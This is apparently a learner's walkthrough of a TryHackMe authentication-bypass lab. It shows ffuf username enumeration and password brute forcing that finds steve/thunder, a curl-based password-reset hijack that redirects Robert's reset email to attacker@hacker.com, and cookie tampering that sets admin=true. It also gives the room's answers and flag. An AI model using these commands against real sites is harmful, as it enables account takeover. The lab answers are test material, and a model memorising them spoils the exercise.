Job [1/1] :: 188 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6550/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6567/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6590/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6623/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6632/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6666/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6678/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6709/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6722/10177] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6750/10177] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6776/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6790/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6816/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6842/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:39] :: Errors: 0 ::: Progress: [6870/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [6896/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [6910/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [6936/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [6956/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [6990/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [7016/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [7030/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:40] :: Errors: 0 ::: Progress: [7056/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7075/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7109/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7126/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7150/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7176/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7193/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7227/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:41] :: Errors: 0 ::: Progress: [7251/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7270/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7296/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7310/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7347/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7363/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7390/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7416/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:42] :: Errors: 0 ::: Progress: [7430/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7467/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7483/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7510/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7536/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7550/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7576/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7591/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:43] :: Errors: 0 ::: Progress: [7625/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7631/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7665/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7671/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7705/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7727/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7751/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7785/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:44] :: Errors: 0 ::: Progress: [7791/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7825/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7831/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7869/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7889/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7911/10177] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7933/10177] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:45] :: Errors: 0 ::: Progress: [7951/10177] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [7969/10177] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [7988/10177] :: Job [1/1] :: 165 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [8024/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [8042/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [8064/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [8088/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [8104/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:46] :: Errors: 0 ::: Progress: [8131/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8150/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:47] :: Errors: 0 :robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 216ms]
:: Progress: [8160/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8184/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8208/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8224/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8250/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8269/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8300/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:47] :: Errors: 0 ::: Progress: [8328/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8344/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8369/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8386/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8412/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8436/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8464/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8484/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:48] :: Errors: 0 ::: Progress: [8499/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8522/10177] :: Job [1/1] :: 175 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8535/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8573/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8589/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8614/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8629/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8654/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:49] :: Errors: 0 ::: Progress: [8687/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8708/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8734/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8749/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8773/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8788/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8822/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:50] :: Errors: 0 ::: Progress: [8828/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:50] :: Errors: 0 :simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 213ms]
:: Progress: [8857/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8867/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8892/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8907/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8934/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8947/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8987/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [8995/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] :: Errors: 0 :steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 212ms]
:: Progress: [8999/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [9027/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] :: Errors: 0 ::: Progress: [9054/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9067/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9107/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9108/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9147/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9174/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9187/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9226/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:52] :: Errors: 0 ::: Progress: [9228/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9267/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9284/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9307/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9345/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9348/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9387/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9404/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:53] :: Errors: 0 ::: Progress: [9427/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9460/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9468/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9491/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9508/10177] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9547/10177] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9548/10177] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9587/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:54] :: Errors: 0 ::: Progress: [9597/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9628/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9667/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9668/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9707/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9711/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9748/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9782/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:55] :: Errors: 0 ::: Progress: [9788/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9827/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9828/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9868/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9893/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9908/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9947/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9948/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:56] :: Errors: 0 ::: Progress: [9988/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:57] :: Errors: 0 ::: Progress: [10012/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10028/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10067/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10068/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10108/10177] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10109/10177] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10148/10177] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:57] :: Errors: 0 :: Progress: [10177/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:58] :: Errors: 0 :: Progress: [10177/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:58] :: Errors: 0 ::
   
```
What is the username starting with si*** ? *simon*

What is the username starting with st*** ? *steve*

What is the username starting with ro**** ? *robert*

### Brute Force 

Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (http://10.10.235.218/customers/login).


A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.


When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.


Bruteforcing with ffuf

           
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.235.218/customers/login -fc 200

        

This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.

Running the above command will find a single working username and password combination that answers the question below.

```
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ ffuf -w /usr/share/seclists/Usernames/Names/valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.235.218/customers/login -fc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.235.218/customers/login
 :: Wordlist         : W1: /usr/share/seclists/Usernames/Names/valid_usernames.txt
 :: Wordlist         : W2: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 240ms]
    * W2: thunder
    * W1: steve

:: Progress: [303/303] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
 What is the valid username and password (format: username/password)? *steve/thunder*

### Logic Flaw 

What is a Logic Flaw?

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/58e63d7810ac4b23051e1dd4a24ef792.png)
Logic Flaw Example
The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.

if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}


Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

Logic Flaw Practical

We're going to examine the Reset Password function of the Acme IT Support website (http://10.10.235.218/customers/reset). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".

For demonstration purposes, we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f457baf00c357990014739bd6bce5b75.png)

At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.

Let's illustrate this by using the curl tool to manually make the request to the webserver.
Curl Request 1:

           
user@tryhackme$ curl 'http://10.10.235.218/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

        

We use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.

The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
Curl Request 2:

           
user@tryhackme$ curl 'http://10.10.235.218/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

        
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3d97e3e37bf9e4db4f95f4f945a7e290.png)

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of {username}@customer.acmeitsupport.thm

Now rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

Curl Request 2 (but using your @acmeitsupport.thm account):

           
user@tryhackme:~$ curl 'http://10.10.235.218/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

        
```
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ curl 'http://10.10.235.218/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Acme IT Support - Customer Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
        <link rel="stylesheet" href="/assets/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">Acme IT Support</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="/">Home</a></li>
                    <li><a href="/news">News</a></li>
                    <li><a href="/contact">Contact</a></li>
                    <li class="active"><a href="/customers">Customers</a></li>
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </nav><div class="container" style="padding-top:60px">
    <h1 class="text-center">Acme IT Support</h1>
    <h2 class="text-center">Reset Password</h2>
    <div class="row">
        <div class="col-md-4 col-md-offset-4">
                        <div class="alert alert-success text-center">
                <p>We'll send you a reset email to <strong>robert@acmeitsupport.thm</strong></p>
            </div>
                    </div>
    </div>
</div>
<script src="/assets/jquery.min.js"></script>
<script src="/assets/bootstrap.min.js"></script>
<script src="/assets/site.js"></script>
</body>
</html>
<!--
Page Generated in 0.04433 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
-->                                                                                           
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ curl 'http://10.10.235.218/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Acme IT Support - Customer Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
        <link rel="stylesheet" href="/assets/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">Acme IT Support</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="/">Home</a></li>
                    <li><a href="/news">News</a></li>
                    <li><a href="/contact">Contact</a></li>
                    <li class="active"><a href="/customers">Customers</a></li>
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </nav><div class="container" style="padding-top:60px">
    <h1 class="text-center">Acme IT Support</h1>
    <h2 class="text-center">Reset Password</h2>
    <div class="row">
        <div class="col-md-4 col-md-offset-4">
                        <div class="alert alert-success text-center">
                <p>We'll send you a reset email to <strong>attacker@hacker.com</strong></p>
            </div>
                    </div>
    </div>
</div>
<script src="/assets/jquery.min.js"></script>
<script src="/assets/bootstrap.min.js"></script>
<script src="/assets/site.js"></script>
</body>
</html>
<!--
Page Generated in 0.04190 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
-->                                                                                           
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$  curl 'http://10.10.235.218/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=witty@customer.acmeitsupport.thm' 

```

*use password reset with robert@acmeitsupport.thm then username robert then create an account  like witty@customer.acmeitsupport.thm to get account robert and then support tickets -> Please don't tell anyone this! THM{AUTH_BYPASS_COMPLETE} *

What is the flag from Robert's support ticket? *THM{AUTH_BYPASS_COMPLETE} *

### Cookie Tampering 

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the HTTP In Detail room on task 6.


Plain Text

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:
Curl Request 1

           
user@tryhackme$ curl http://10.10.235.218/cookie-test

        

We can see we are returned a message of: Not Logged In

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:
Curl Request 2

           
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.235.218/cookie-test

        

We are given the message: Logged In As A User

Finally, we'll send one last request setting both the logged_in and admin cookie to true:
Curl Request 3

           
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.235.218/cookie-test

        

This returns the result: Logged In As An Admin as well as a flag which you can use to answer question one.

Hashing

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:
Original String
	Hash Method
	Output
1
	md5
